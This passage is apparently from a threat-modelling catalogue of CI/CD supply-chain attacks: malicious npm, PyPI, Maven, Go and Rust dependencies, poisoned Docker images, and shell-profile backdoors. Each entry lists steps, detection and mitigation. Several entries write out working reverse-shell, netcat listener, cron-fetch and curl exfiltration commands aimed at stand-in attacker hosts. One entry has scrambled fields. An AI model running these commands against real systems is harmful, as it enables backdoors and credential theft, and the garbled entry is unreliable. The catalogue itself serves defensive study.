- **Scenario**: Dependency prints all environment variables and inputs to a remote logger service during install.
- **Attack Steps**: 1. Attacker publishes ci-fast-logger dependency. 2. The install script is designed to collect printenv output. 3. All environment variables, including secrets, AWS credentials, and CI tokens, are captured. 4. The script sends them to logger.attacker.net using curl POST. 5. This happens silently during the npm install or pip install step. 6. Logs include build identifiers, repo URLs, and workflow parameters. 7. The attacker builds profiles for internal pipeline configurations. 8. This intelligence is later used to craft phishing emails and targeted intrusions. 9. Detection occurs after build logs show unexpected POST requests. 10. Analysts trace it back to the rogue dependency and block the domain.
- **Detection**: Analyze outbound requests in build logs
- **Solution**: Use dependency allowlist and --no-scripts options
- **Tags**: #envleak #curl #buildlogger

## Malicious Dependency Creates .bashrc Backdoor

- **Attack Type**: Persistent Shell Injection
- **Target**: Developer & CI Shells
- **Vulnerability**: Bashrc modification
- **MITRE**: T1037.005
- **Impact**: Repeated access via shell
- **Tools**: Bash
- **Scenario**: A malicious dependency injects a reverse shell into .bashrc, triggering on every shell launch.
- **Attack Steps**: 1. Dependency shelltools-helper has a postinstall script. 2. It appends bash -i >& /dev/tcp/attacker.net/1234 0>&1 to .bashrc. 3. Whenever a developer or CI runner opens a shell, the reverse shell is triggered. 4. The attacker gets a terminal with the same privileges as the user. 5. They explore the runner and find credentials or artifacts from other builds. 6. They maintain persistence across reboots as .bashrc is retained. 7. When noticed, it appears as a normal part of the user config. 8. This enables repeated unauthorized access until .bashrc is audited. 9. Reverse shell connects to a dynamic DNS endpoint to evade detection. 10. Security response teams eventually block the destination and restore .bashrc.
- **Detection**: Monitor shell startup scripts
- **Solution**: Harden dotfiles, scan for shell callbacks
- **Tags**: #bashrc #reverse-shell #ciabuse

## Prebuilt Binary Dependency Alters PATH

- **Attack Type**: PATH Injection Attack
- **Target**: CI/CD Tools
- **Vulnerability**: Precompiled binary override
- **MITRE**: T1036.005
- **Impact**: Execution hijack in build scripts
- **Tools**: Bash, Node.js
- **Scenario**: A dependency installs its own binaries and changes PATH to run them instead of trusted versions.
- **Attack Steps**: 1. ci-binary-tools installs precompiled binaries to /tmp/bin. 2. It modifies PATH in .bash_profile or inline in build scripts. 3. Common commands like curl, git, and grep are overridden with backdoored versions. 4. These versions log arguments and send them to attacker servers. 5. Since they output expected results, developers don’t suspect. 6. The attacker collects repo URLs, file hashes, and auth tokens used in scripts. 7. Even output of secrets scanned by grep is captured. 8. CI jobs become fully observable to the attacker. 9. Detection occurs only when checksums of binaries are verified. 10. Forensics reveal PATH tampering in the install phase.
- **Detection**: Compare binary hashes, log PATH diffs
- **Solution**: Use clean containers, strip PATH changes
- **Tags**: #binaryoverride #pathabuse #ci

## Dockerfile COPY of Malicious Node Module

- **Attack Type**: Docker Layer Poisoning
- **Target**: Docker Builds
- **Vulnerability**: Copied-in infected files
- **MITRE**: T1525
- **Impact**: Persistent leak via Docker
- **Tools**: Docker, Node.js
- **Scenario**: Malicious module is copied into container during build, infecting future runs with outbound data theft logic.
- **Attack Steps**: 1. Dockerfile has COPY ./node_modules /app/node_modules. 2. An attacker sneaks in a modified request module that includes data exfil logic. 3. The build proceeds, and Docker caches the layer. 4. On every run of the container, the malicious module sends system stats to the attacker. 5. Data includes CPU, memory usage, uptime, and installed packages. 6. This helps attacker map infrastructure usage. 7. Since the module name is legitimate, scanning misses the change. 8. Detection happens only when reverse-engineering container logs. 9. Cached layers allow persistence even after module is deleted in code. 10. Rebuilds from scratch are required to remove infection.
- **Detection**: Force rebuild of image layers
- **Solution**: Avoid copying entire modules, use CI filters
- **Tags**: #docker #layerattack #nodejs

## CI Test Dependency Sends Results to Public Gist

- **Attack Type**: Silent Test Data Leak
- **Target**: CI Test Runners
- **Vulnerability**: Test logs exposure
- **MITRE**: T1530
- **Impact**: Sensitive debug info leaked
- **Tools**: GitHub API
- **Scenario**: A CI test library posts test failure reports, stack traces, and logs to a public GitHub Gist.
- **Attack Steps**: 1. Dependency ci-test-analyzer includes logic to POST test reports to GitHub Gist API. 2. This is enabled by default in test runner. 3. Logs include filenames, internal paths, error messages, and sometimes test tokens. 4. Gists are created as unlisted but accessible by link. 5. Attacker scans GitHub for such gists and aggregates the data. 6. Useful insights include API endpoint usage, DB schema errors, and version info. 7. Devs don't notice as builds pass and reports are still available internally. 8. Security team spots public gists from company domain. 9. Traced back to the test dependency used in package.json. 10. Removed and replaced with a local-only test logger.
- **Detection**: Monitor external API use in test tools
- **Solution**: Use local test reporting only
- **Tags**: #testlogleak #gistabuse #ci

## Build-Time Hook Opens Port Listener

- **Attack Type**: Local Port Listener Backdoor
- **Target**: CI Runner Hosts
- **Vulnerability**: Netcat listener during build
- **MITRE**: T1055
- **Impact**: Full runner compromise
- **Tools**: Bash, Netcat
- **Scenario**: During build, a hook starts a background process that listens on a random port and accepts remote commands.
- **Attack Steps**: 1. Dependency build-portlist runs a background listener using netcat. 2. It chooses a random port between 3000–9000 and runs nc -l -p $PORT -e /bin/bash. 3. The process runs in background and survives even after build ends. 4. Attacker scans public IPs for open ports and connects to control the runner. 5. This works in self-hosted CI setups where firewall rules are relaxed. 6. Any command run by attacker has access to the build workspace. 7. They monitor build scripts, fetch credentials, and tamper outputs. 8. If CI runners are reused, the backdoor remains active. 9. Port scanning reveals this behavior. 10. Killed manually after incident response initiated.
- **Detection**: Scan for open ports during build
- **Solution**: Avoid self-hosted runners without isolation
- **Tags**: #netcat #portabuse #ciattack

## Malicious Java Dependency Triggers Callback to Attacker on Runtime

- **Attack Type**: Malicious Code in Third-Party JAR
- **Target**: Java CI/CD
- **Vulnerability**: Static block abuse in JAR
- **MITRE**: T1204.002
- **Impact**: Environment intel leakage
- **Tools**: Maven, Java
- **Scenario**: A malicious Java library, bundled via Maven, includes runtime code that calls an attacker-controlled endpoint to report application metadata.
- **Attack Steps**: 1. Attacker uploads a malicious Java package named metrics-helper-core to a public Maven repo. 2. Inside the package, a class includes a static block that executes when the class is loaded at runtime. 3. This block collects app metadata (version, host IP, memory config) and sends it to http://callback.attacker.com/track. 4. A developer unknowingly adds the package for a logging utility. 5. During build, Maven fetches and includes the JAR file. 6. The CI/CD pipeline builds the app and pushes it to production. 7. On first execution of the class, the attacker’s server receives the beacon signal with environment context. 8. The attacker uses this info to map internal environments and identify staging/prod systems. 9. Detection is difficult because the code does not crash or misbehave. 10. Eventually, outbound traffic analysis reveals the suspicious callback.
- **Detection**: Monitor unknown outbound endpoints
- **Solution**: Use internal artifact repos with vetted packages
- **Tags**: #maven #jarabuse #javabackdoor

## Malicious Rust Crate Adds Build-Time Keylogger

- **Attack Type**: Build Hook with Input Capture
- **Target**: Rust Build System
- **Vulnerability**: Exploiting build.rs script
- **MITRE**: T1056
- **Impact**: Keystroke logging in CI
- **Tools**: Cargo (Rust), Netcat
- **Scenario**: A Rust crate contains a build.rs file that compiles and runs during build, logging terminal keystrokes and exfiltrating them.
- **Attack Steps**: 1. Attacker uploads a crate named terminal-utils-fast to crates.io. 2. Inside the crate, a build.rs script is defined. 3. The script uses Rust’s std::io to silently log terminal input and writes the log to /tmp/keystrokes.log. 4. After logging enough content, it uses a shell command to send the file via netcat to attacker.com:9001. 5. A developer includes the crate for text formatting in CLI tools. 6. During the CI build, the build.rs is executed automatically by Cargo. 7. It logs any interactive inputs made during build or test phases. 8. Even partial secrets or commands are leaked this way. 9. Detection is delayed as the logs are cleaned up post-build. 10. An audit of build.rs scripts reveals the malicious logic later.
- **Detection**: Analyze custom build.rs code
- **Solution**: Avoid unknown crates or review scripts pre-build
- **Tags**: #rust #keystroke #buildhook

## Compromised Docker Image Adds Crontab Entry

- **Attack Type**: Persistence via Build Image
- **Target**: bash`. 4. A developer uses this image as the base for a Node.js app. 5. CI/CD builds the final image on top of this compromised base. 6. The malicious cron entry runs every minute, giving the attacker periodic access. 7. Even after the image is deployed, the crontab runs silently in the background. 8. Security team notices outbound traffic spikes. 9. Logs show regular curl executions to the same domain. 10. Investigation reveals the rogue base image as the root cause.
- **Vulnerability**: Docker Builds
- **MITRE**: Cron job persistence
- **Impact**: T1053.003
- **Tools**: Docker, Crontab
- **Scenario**: A Docker base image pulls a script that modifies crontab and creates a persistence backdoor.
- **Attack Steps**: 1. Attacker publishes a Docker image on Docker Hub named node-base-lite. 2. Inside the Dockerfile, it pulls a script from attacker.com/install.sh. 3. The script adds a crontab entry: `* * * * * curl attacker.com/cmd
- **Detection**: Scheduled access backdoor
- **Solution**: Monitor running crontabs in containers
- **Tags**: Always build from verified base images

## Python Dependency Uses Steganography in Build Logs

- **Attack Type**: Covert Data Leak via Logs
- **Target**: Python, CI Logs
- **Vulnerability**: Covert exfil in formatting
- **MITRE**: T1001.002
- **Impact**: Secret leak via logs
- **Tools**: Python, CI Logs
- **Scenario**: A Python library hides exfiltrated credentials in whitespace patterns within CI build logs.
- **Attack Steps**: 1. Attacker releases flask-visual-debugger on PyPI. 2. Its setup.py prints structured output where indentation encodes secrets using binary via whitespace. 3. For example, tab = 1, space = 0; the sequence represents ASCII characters. 4. CI/CD build logs display these formatted outputs, which look normal to developers. 5. Attacker collects public CI logs (Travis, GitHub Actions) and decodes the patterns. 6. Extracted info includes DB credentials and API keys from env variables. 7. Developers don’t notice because logs look like styled debug output. 8. Steganography avoids triggering DLP or pattern-matching tools. 9. Detection is difficult unless whitespace patterns are analyzed manually. 10. Eventually discovered by a vigilant reviewer comparing logs and codebase.
- **Detection**: Analyze CI logs for hidden patterns
- **Solution**: Use log sanitizers and strip whitespace logs
- **Tags**: #logleak #steganography #pypi

## NPM Install Hook Enables Interactive Shell

- **Attack Type**: Persistent Reverse Shell via CI
- **Target**: CI Build Runners
- **Vulnerability**: Preinstall shell access
- **MITRE**: T1059.004
- **Impact**: Shell access to CI env
- **Tools**: npm, Bash
- **Scenario**: A malicious npm package uses an install hook to open an interactive shell back to the attacker on build.
- **Attack Steps**: 1. Attacker publishes build-shell-core to npm. 2. The package.json defines a preinstall hook that spawns a bash reverse shell using bash -i >& /dev/tcp/.... 3. When this package is installed as a dependency, the reverse shell is triggered. 4. In CI/CD pipelines, this provides the attacker a live shell in the runner. 5. They can explore build environment, modify artifacts, and exfiltrate tokens. 6. The connection is silent and ephemeral, disappearing when build ends. 7. This is repeated across all builds where the dependency is used. 8. Logs show no error unless verbose mode is on. 9. A random build failure triggers investigation. 10. Security audit identifies the rogue shell script in package.json.
- **Detection**: Monitor scripts in package.json
- **Solution**: Use --ignore-scripts or audit scripts
- **Tags**: #npm #shellhook #buildbackdoor

## Build Dependency Sends Artifacts to Dropbox

- **Attack Type**: Cloud Storage Leak
- **Target**: Build Artifacts
- **Vulnerability**: Cloud API misuse
- **MITRE**: T1537
- **Impact**: Code and config leak
- **Tools**: Dropbox API, Node.js
- **Scenario**: A dependency uploads build artifacts to attacker-controlled Dropbox account using the API.
- **Attack Steps**: 1. Attacker creates artifact-uploader-lite and publishes to npm. 2. Inside, a postinstall script zips the dist/ directory and uploads to Dropbox via token. 3. This runs after each successful build, targeting the compiled code. 4. Even if the build is private, compiled JS files, configs, and secrets are exfiltrated. 5. The attacker sets up multiple Dropbox tokens for redundancy. 6. The Dropbox folder is private and logs the IP of uploads. 7. Developers don’t notice as it runs post-success. 8. Suspicious traffic to Dropbox flagged by proxy. 9. Manual inspection of dependencies reveals the script. 10. Action taken: block domain and remove the dependency.
- **Detection**: Monitor traffic to cloud APIs
- **Solution**: Avoid dependencies with file access in scripts
- **Tags**: #dropbox #ciabuse #artifactleak

## Go Module with Encrypted Payload Triggered on Test

- **Attack Type**: Trigger-Based Code Injection
- **Target**: Go Testing Phase
- **Vulnerability**: Encrypted test payloads
- **MITRE**: T1204.001
- **Impact**: Secret exfil via go test
- **Tools**: Go, Base64
- **Scenario**: A Go module carries a base64-encrypted payload triggered only during go test.
- **Attack Steps**: 1. Attacker publishes test-helper-pro on Go proxy. 2. The module contains base64-encoded data that, when decoded, executes shell commands. 3. The code to decode and execute is wrapped inside a TestMain() function. 4. During CI test phase, this payload is triggered. 5. It sets up a temporary file in /tmp, writes logs from environment, and uploads to attacker. 6. It deletes itself after execution to avoid detection. 7. The test logs show only partial info, masking the command. 8. Detection occurs when unusual test delays are reported. 9. Analyzed test binary reveals hidden logic. 10. Module is pulled and added to denylist.
- **Detection**: Instrument test binaries before run
- **Solution**: Avoid test-only helper modules from unknown origin
- **Tags**: #go #testleak #ciinject

## Python Setup Script Creates Fake DNS Queries

- **Attack Type**: DNS Exfiltration During Build
- **Target**: Python Pip Installs
- **Vulnerability**: DNS secret leak
- **MITRE**: T1048.003
- **Impact**: Covert channel via DNS
- **Tools**: Python, dnspython
- **Scenario**: A Python setup script encodes secrets into DNS requests and sends to attacker domain.
- **Attack Steps**: 1. dns-leak-analyzer package contains a setup.py that reads .env. 2. Secrets are converted into subdomains like awskey123.attacker.com. 3. Python uses dnspython to resolve these, triggering a DNS request. 4. The attacker logs incoming queries on their DNS server. 5. No HTTP traffic occurs, bypassing firewalls. 6. This exfil happens silently during package install. 7. Developers using pip or CI include the package unknowingly. 8. Detection only possible with DNS traffic logging. 9. Found later during DNS forensic analysis. 10. The attacker collects tokens without triggering alerts.
- **Detection**: Enable DNS traffic logging in build infra
- **Solution**: Use .pypirc index mirrors with strict access
- **Tags**: #dnsleak #python #buildscripts

## Bash Build Tool Modifies .git/config to Leak Repo URL

- **Attack Type**: Git Metadata Exfiltration
- **Target**: Git CI
- **Vulnerability**: Git hook abuse
- **MITRE**: T1546.001
- **Impact**: Internal repo exposure
- **Tools**: Bash, Git
- **Scenario**: A malicious bash-based build tool appends a post-commit hook to .git/config that emails internal repo URLs.
- **Attack Steps**: 1. build-boost.sh script is added to CI tools. 2. It modifies .git/config to add a post-commit hook. 3. The hook runs git remote -v and sends output via mailx or curl to attacker. 4. Internal repo URLs, private remotes, and tokens (if in URL) are exposed. 5. Attack is subtle and happens only on commit. 6. CI/CD doesn’t detect it since the change is local. 7. Developers syncing repos trigger the hook. 8. Security review of .git/config finds the backdoor. 9. Audits show which devs synced affected tools. 10. Hook removed and mailx blocked.
- **Detection**: Scan .git/hooks and config diffs
- **Solution**: Disable hook execution in shared CI
- **Tags**: #githook #ci #repoleak

## Maven Plugin Logs Build Config to Pastebin

- **Attack Type**: Public Paste Leak
- **Target**: Maven CI
- **Vulnerability**: Pastebin abuse
- **MITRE**: T1530
- **Impact**: Leakage of build system configs
- **Tools**: Java, Pastebin API
- **Scenario**: A malicious Maven plugin uploads build.gradle and pom.xml configs to Pastebin.
- **Attack Steps**: 1. Plugin maven-logger-lite is introduced into CI. 2. It reads pom.xml and build.gradle contents. 3. Sends them via Pastebin API using attacker token. 4. Configs include sensitive repo URLs, credentials in plaintext, and version details. 5. These are made unlisted but attacker accesses directly. 6. Plugin logs pretend to be standard debug output. 7. After detection, Pastebin entries are reported and removed. 8. CI audit finds plugin was added by a contributor. 9. Access revoked and plugin purged from builds. 10. Blocklists updated to catch similar behavior.
- **Detection**: Monitor usage of public paste services
- **Solution**: Block access to known paste endpoints from CI
- **Tags**: #pastebin #maven #configleak

## Compromised Python Dependency with Timed Credential Exfiltration

- **Attack Type**: Timed Execution in Build
- **Target**: Python Pip Build
- **Vulnerability**: Abusing setup.py for delayed execution
- **MITRE**: T1204.001
- **Impact**: Stealthy leak of AWS keys
- **Tools**: PyPI, Python setup.py, requests
- **Scenario**: A Python package silently collects AWS keys during build and uploads them after a random delay to avoid pattern detection.
- **Attack Steps**: 1. The attacker publishes a seemingly useful package called config-manager-py on PyPI. 2. This package contains a setup.py file that is automatically executed when the package is installed. 3. Inside setup.py, a background thread is initialized that waits a random delay (between 90–300 seconds) to evade script timing detectors. 4. After the wait, the script reads AWS credentials from the environment (e.g., AWS_SECRET_ACCESS_KEY, AWS_ACCESS_KEY_ID). 5. It formats the credentials and prepares a stealthy HTTP POST request using the Python requests library. 6. The request is sent to an attacker-controlled domain (api.attacker-cloud.com/upload). 7. During this time, the CI/CD pipeline logs do not reflect any anomaly since the request is asynchronous and doesn’t throw any error. 8. Developers only notice delayed failures in cloud deployments due to revoked keys. 9. Upon investigation, unusual DNS queries and outbound requests during build were found. 10. This leads to auditing the dependency, discovering the background thread in setup.py, and identifying the exfiltration method.
- **Detection**: Enable deep dependency scanning and traffic profiling
- **Solution**: Use internal mirrors and allowlisting for PyPI packages
- **Tags**: #python #pypi #setup-exfil

## Node.js Package Leaks .npmrc Config to Paste Service

- **Attack Type**: Config File Exfil via Install Hook
- **Target**: Node.js CI Pipelines
- **Vulnerability**: Credential harvesting via postinstall
- **MITRE**: T1552
- **Impact**: Token exfiltration through config files
- **Tools**: npm, Pastebin API
- **Scenario**: An NPM package with a postinstall hook reads .npmrc config and silently uploads it to Pastebin, leaking registry tokens.
- **Attack Steps**: 1. Attacker uploads a package named fast-package-manager to npm. 2. The package contains a postinstall script defined in package.json. 3. During installation in CI/CD, this script runs automatically after all dependencies are installed. 4. The script is written in Node.js and includes logic to locate and read the .npmrc file from the project root or home directory. 5. .npmrc may contain private registry URLs and authentication tokens used for accessing private packages. 6. The attacker script uses the Pastebin API to create an unlisted paste with the contents of .npmrc. 7. It stores the paste URL silently and ends execution without producing any console output. 8. Since CI logs show no anomalies, the leak remains hidden. 9. Developers later notice unauthorized package downloads and registry misuse. 10. A code audit finds the postinstall hook and the leak function targeting the config file.
- **Detection**: Monitor postinstall behavior and token usage
- **Solution**: Use --ignore-scripts during installs and isolate sensitive config files
- **Tags**: #npmrc #configleak #postinstall

## Maven Plugin Adds Anonymous Backdoor Shell to WAR File

- **Attack Type**: Payload Injection into Artifact
- **Target**: Java Web Deployments
- **Vulnerability**: Artifact manipulation via plugin
- **MITRE**: T1609
- **Impact**: RCE via embedded webshell
- **Tools**: Maven, WAR, JSP
- **Scenario**: A Maven plugin injects a hidden JSP web shell into the final WAR file during build, allowing runtime code execution.
- **Attack Steps**: 1. The attacker creates a fake plugin called maven-webshell-injector and hosts it on a public repository. 2. A developer unknowingly includes it to optimize resource bundling. 3. The plugin intercepts the packaging phase of the Maven lifecycle. 4. It programmatically inserts a hidden .jsp file named .help.jsp into the WEB-INF directory. 5. This JSP file is a classic web shell that accepts commands via a query parameter and runs them on the server. 6. The WAR file is finalized and uploaded to an internal artifact repository. 7. The app is deployed to production, and the hidden web shell becomes accessible at /WEB-INF/.help.jsp. 8. The attacker sends crafted requests with base64-encoded commands to this endpoint. 9. Execution happens silently, and logs don’t indicate external use unless WAF is configured. 10. The issue is discovered only when an IR team reviews WAR content after abnormal server behavior.
- **Detection**: Inspect final build artifacts for unauthorized files
- **Solution**: Use signed plugins and perform artifact integrity scans
- **Tags**: #maven #warbackdoor #jspwebshell

## Compromised Golang Dependency Opens Listener on CI Port

- **Attack Type**: Runtime Listener in Test Phase
- **Target**: Golang CI Tests
- **Vulnerability**: Port listener via init()
- **MITRE**: T1046
- **Impact**: Runtime data extraction
- **Tools**: Golang, net.Listener
- **Scenario**: A Go dependency sets up a TCP listener on the CI/CD runner to collect test environment details during runtime.
- **Attack Steps**: 1. Attacker publishes a library called metrics-collector-go on a public Go proxy. 2. The library seems to collect performance metrics and is added as a test dependency. 3. In the init() function of the main file, a TCP listener is launched on a high-numbered random port. 4. It collects environment variables, file names, and temporary file contents during test execution. 5. The attacker connects to this listener during build via VPN or cloud shell. 6. The collected data is streamed back silently and discarded from CI logs. 7. Most CI runners don’t monitor local ports, so the breach remains hidden. 8. Eventually, a security team detects random open ports and abnormal listening behavior. 9. Code review confirms the TCP listener is initialized automatically in the background. 10. The library is removed, and outbound port access is restricted on runners.
- **Detection**: Monitor open ports and listeners in CI
- **Solution**: Use sandboxing or no-network runners
- **Tags**: #golang #initlistener #cienvleak

## Artifact Repository Poisoned via Misnamed Library

- **Attack Type**: Typosquatting Internal Modules
- **Target**: Internal CI Pipelines
- **Vulnerability**: Package name impersonation
- **MITRE**: T1554
- **Impact**: Internal secrets leak via typo package
- **Tools**: Artifactory, GitHub Packages
- **Scenario**: A malicious actor publishes a package mimicking internal naming conventions, poisoning internal artifact resolution.
- **Attack Steps**: 1. The attacker identifies internal package names used in a company, like internal-core-utils. 2. They upload a public version named internal_core_utils with slight variation to GitHub Packages. 3. Due to misconfigured dependency resolvers or auto-fallback in CI, the external package is pulled. 4. This malicious package includes scripts that dump all ENV variables and send them to a webhook URL. 5. These secrets include DB URLs, CI tokens, and sometimes internal proxy credentials. 6. The CI build continues successfully, hiding the issue. 7. Security team notices unfamiliar package hashes in builds. 8. Investigation reveals the fallback to public due to resolver misordering. 9. Artifact registry settings are hardened to only pull from internal sources. 10. The typo package is reported and removed from public registry.
- **Detection**: Enforce internal-only resolution in package managers
- **Solution**: Lock dependency paths and validate SHA hashes
- **Tags**: #typosquat #artifactpoisoning #ciabuse

## Dockerfile FROM Instruction Pulls Backdoored Base

- **Attack Type**: Malicious FROM Base Image
- **Target**: Container Build System
- **Vulnerability**: .bashrc shell alias backdoor
- **MITRE**: T1547.001
- **Impact**: Command-level telemetry leak
- **Tools**: Docker Hub, Bash
- **Scenario**: An attacker publishes a Docker base image that includes a hidden backdoor triggered after container startup.
- **Attack Steps**: 1. Attacker builds and publishes a Docker image node-base-14-secure on Docker Hub. 2. The image appears to offer security optimizations for Node.js. 3. Internally, the image has a .bashrc file that includes a backdoor shell alias triggered on any ls command. 4. This alias runs a hidden curl command to send container info to attackerhost.net. 5. Developers use the image as base: FROM attackerhost/node-base-14-secure. 6. When containers spin up during build or test, the .bashrc is sourced. 7. Running simple shell commands triggers the exfil. 8. The logs don’t show this as the command output appears normal. 9. Later, netflow analysis shows repeated pings to a fixed IP. 10. The container is traced back to the backdoored base.
- **Detection**: Strip dotfiles and validate Docker base hashes
- **Solution**: Use private trusted images and disallow external FROMs
- **Tags**: #docker #baseimage #bashrc

## RubyGem Modifies CI Runner’s Shell Profile

- **Attack Type**: Persistence via .bash_profile Injection
- **Target**: Ruby CI Agents
- **Vulnerability**: Profile file abuse
- **MITRE**: T1546.004
- **Impact**: Long-term persistence in CI agents
- **Tools**: Ruby, .bash_profile
- **Scenario**: A malicious RubyGem modifies the CI runner’s .bash_profile to ensure persistent attacker callbacks in future sessions.
- **Attack Steps**: 1. A gem called shell-helper-fast is released by attacker. 2. Inside the gem, a postinstall hook runs a Ruby script. 3. The script locates the home directory and opens .bash_profile. 4. It appends a curl command that fetches and runs code from a remote URL on every new shell session. 5. The hook ensures this is written idempotently, so it survives multiple runs. 6. CI/CD runners using bash or zsh inherit this behavior on every job. 7. This leads to repeated data exfil or code injection even across builds. 8. Reviewers discover this when investigating unrelated pipeline slowness. 9. .bash_profile diffing reveals the curl command. 10. CI hardened to use stateless runners that don’t persist profiles.
- **Detection**: Rebuild CI runners for every job; audit profile files
- **Solution**: Restrict file write access in ephemeral environments
- **Tags**: #rubygem #bashprofile #cihooks

## Malicious Gradle Plugin Creates Encrypted Zip of Artifacts

- **Attack Type**: Stealth File Packing for Exfiltration
- **Target**: Java Build Artifacts
- **Vulnerability**: Covert file exfil via encrypted uploads
- **MITRE**: T1005
- **Impact**: Leak of compiled artifacts and configs
- **Tools**: Gradle, AWS S3 SDK
- **Scenario**: A rogue Gradle plugin zips and encrypts build artifacts, sending them to an S3 bucket controlled by attacker.
- **Attack Steps**: 1. Attacker creates gradle-artifact-packager and uploads to a plugin portal. 2. The plugin runs post-build and silently collects .class, .jar, and .xml files. 3. It zips them and encrypts the zip using AES before uploading. 4. The S3 bucket is private and accepts uploads via hardcoded credentials in plugin. 5. The plugin logs misleading success messages to avoid suspicion. 6. S3 logs show regular uploads from CI IPs. 7. The breach is discovered after abnormal costs and data usage on AWS. 8. A full plugin audit reveals the code block performing the zip and upload. 9. The plugin is removed and credentials rotated. 10. Artifact publishing flow is reviewed to strip such plugins.
- **Detection**: Use least-privilege AWS keys, review plugin behavior
- **Solution**: Strip unverified plugins from build lifecycle
- **Tags**: #gradle #aeszip #artifacts

## Malicious Dependency in requirements.txt Fetches Shellcode

- **Attack Type**: On-Install Shellcode Loader
- **Target**: Python CI Install
- **Vulnerability**: Shellcode loader via ctypes
- **MITRE**: T1055.001
- **Impact**: Memory-resident malware during build
- **Tools**: Python, ctypes
- **Scenario**: A PyPI package included in a requirements.txt file downloads and runs obfuscated shellcode.
- **Attack Steps**: 1. The attacker uploads pysecurelib on PyPI. 2. The library uses Python’s ctypes to allocate executable memory. 3. During installation, it downloads base64-encoded shellcode from a paste site. 4. It decodes and loads the shellcode into memory and executes it in the Python process. 5. The shellcode establishes an outbound connection to attacker server. 6. This behavior is masked inside a try-except block with fallback code. 7. CI runners don’t report errors, and build passes. 8. Memory monitoring tools later detect unknown threads. 9. Forensics reveals executable heap space use from Python process. 10. PyPI package is reported and added to denylist.
- **Detection**: Use runtime memory analysis during build
- **Solution**: Block external paste URLs from CI runners
- **Tags**: #python #shellcode #ctypesabuse

## Jenkins Shared Library with Hidden Callback Script

- **Attack Type**: Malicious Jenkins Shared Step
- **Target**: Jenkins Pipelines
- **Vulnerability**: Abusing shared Groovy logic
- **MITRE**: T1557.003
- **Impact**: Persistent CI data exposure
- **Tools**: Jenkins, Groovy
- **Scenario**: A Jenkins shared library is modified to include a step that leaks environment details to the attacker.
- **Attack Steps**: 1. A shared library for Jenkins is maintained by a dev team. 2. A rogue contributor modifies a common step used across jobs. 3. The added line captures environment variables and posts to https://logger.attacker.site. 4. This step runs silently and is buried among dozens of Groovy script lines. 5. The library is auto-loaded by Jenkins jobs and affects every build. 6. For months, secrets and job configs are leaked. 7. Logs show nothing as requests are silent. 8. Upon review, git diff shows the hidden line. 9. Access control to repo is changed. 10. Shared libraries are now scanned before merges.
- **Detection**: Lock shared library access and audit each commit
- **Solution**: Use static analyzers on Groovy CI code
- **Tags**: #jenkins #sharedlib #ciabuse

## Malicious Python Dependency Hijacks SSH Config

- **Attack Type**: SSH Credential Exfiltration via Build Step
- **Target**: Python CI Jobs
- **Vulnerability**: Exfiltration of SSH credentials
- **MITRE**: T1552.004
- **Impact**: Full Git repo or server access via stolen keys
- **Tools**: Python, os, base64, requests
- **Scenario**: A dependency hides logic in its setup.py to read and exfiltrate SSH configuration and private keys during the build.
- **Attack Steps**: 1. Attacker publishes a library named pyenv-manager to PyPI, which appears to help manage environment variables in Python. 2. The setup.py includes hidden logic that triggers automatically upon package installation. 3. This logic searches for the .ssh directory in the home path and reads config, id_rsa, and known_hosts files. 4. The private key (id_rsa) is base64 encoded to avoid detection by plain string matchers. 5. A POST request is prepared and sent to an external API (attacker-control.site/steal). 6. The connection is masked by using a common user-agent string and time delays to mimic normal requests. 7. Since installation is non-interactive and CI logs don’t expose the payload, the breach stays hidden. 8. Build completes successfully, and the user’s deployment to Git or cloud succeeds without errors. 9. Days later, unauthorized Git commits and SSH-based attacks are observed. 10. Security teams trace the initial compromise back to the rogue setup.py.
- **Detection**: Monitor CI environment for SSH activity during builds
- **Solution**: Run dependencies in jailed environments without user-level access
- **Tags**: #ssh #setup_py #pypiattack

## NPM Package Auto-Forks Repository to Attacker GitHub

- **Attack Type**: Code Leak via Git Automation
- **Target**: GitHub CI/CD Pipelines
- **Vulnerability**: Unauthorized source code replication
- **MITRE**: T1087.003
- **Impact**: Source code IP theft
- **Tools**: Node.js, Git, child_process
- **Scenario**: A malicious npm package clones and pushes the current working repository to an attacker’s GitHub account silently during build.
- **Attack Steps**: 1. Attacker creates a package named repo-audit-logger claiming to analyze Git history. 2. During install, the package spawns a child process to execute Git commands. 3. It creates a temporary Git config with attacker credentials. 4. It initializes a new remote pointing to https://github.com/attacker-org/steal.git. 5. The full source code in the CI working directory is committed and pushed to that remote. 6. All of this happens silently during build, with no output due to suppressed logs. 7. After push, the script deletes the .git directory to avoid traceability. 8. Developers later discover cloned repositories with proprietary code on the internet. 9. Digital forensics links the breach back to this malicious npm module. 10. All builds using it are stopped, and repo access tokens are revoked.
- **Detection**: Restrict Git commands in CI environments
- **Solution**: Use dry-run and containerized builds
- **Tags**: #npm #gitleak #codeexfiltration

## Malicious Go Module Triggers Outbound DNS for CI Job IDs

- **Attack Type**: DNS Beaconing for Job Identification
- **Target**: GoLang CI Pipelines
- **Vulnerability**: Metadata leak via DNS
- **MITRE**: T1071.004
- **Impact**: Recon and fingerprinting of CI pipelines
- **Tools**: Golang, net, custom DNS server
- **Scenario**: A Go module uses DNS queries to encode CI job IDs and leak them to the attacker’s DNS server.
- **Attack Steps**: 1. Attacker uploads a Go package named goenvmetrics. 2. The init() function constructs a DNS query string embedding the CI job ID from environment variables. 3. The query is sent to a subdomain like ci1234.attacker-dns.net. 4. The attacker’s DNS logs receive the full job ID, repo slug, or internal tokens encoded in subdomains. 5. Since DNS traffic is often ignored in CI security policies, the beaconing remains unnoticed. 6. Repeated queries indicate the scope and size of deployments using the package. 7. The attacker correlates job IDs with known public repositories to fingerprint companies. 8. A red team simulation uncovers the beaconing. 9. DNS logs from CI environments confirm the timing match. 10. The package is removed and outbound DNS traffic is restricted for runners.
- **Detection**: Monitor for external DNS queries with encoded data
- **Solution**: Use DNS sinkholes and DNS-over-TLS logging
- **Tags**: #dnsleak #golang #jobid

## Docker Compose Pulls Poisoned Image from Similar Registry

- **Attack Type**: Registry Confusion Poisoning
- **Target**: Docker Compose Pipelines
- **Vulnerability**: Registry impersonation
- **MITRE**: T1190
- **Impact**: Pull-time poisoning and stealth backdoor
- **Tools**: Docker Compose, DNS Spoof
- **Scenario**: A docker-compose.yml uses an image source that looks internal but actually pulls from attacker registry.
